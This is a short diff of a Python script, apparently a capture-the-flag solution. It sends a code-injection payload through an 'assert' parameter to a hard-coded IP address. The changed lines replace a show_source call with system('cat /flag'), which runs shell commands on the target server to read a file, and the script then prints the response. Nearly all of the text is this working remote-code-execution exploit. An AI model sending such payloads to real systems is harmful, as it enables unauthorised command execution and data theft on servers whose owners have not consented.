@@ -9,10 +9,8 @@ import requests
 if __name__ == "__main__":
     data = {
         "hello":"assert",
-        "world":"show_source(\"/flag\");"
+        "world":"system('cat /flag')"
     }
     sess = requests.session()
-    response = sess.post("http://202.112.51.130:28083/?i=security", data=data)
-    with open("response.html",'w',encoding="utf8") as f:
-        f.write(response.text)
-        f.close()
+    response = sess.post("http://202.112.51.130:28020/?i=security", data=data)
+    print(response.text)
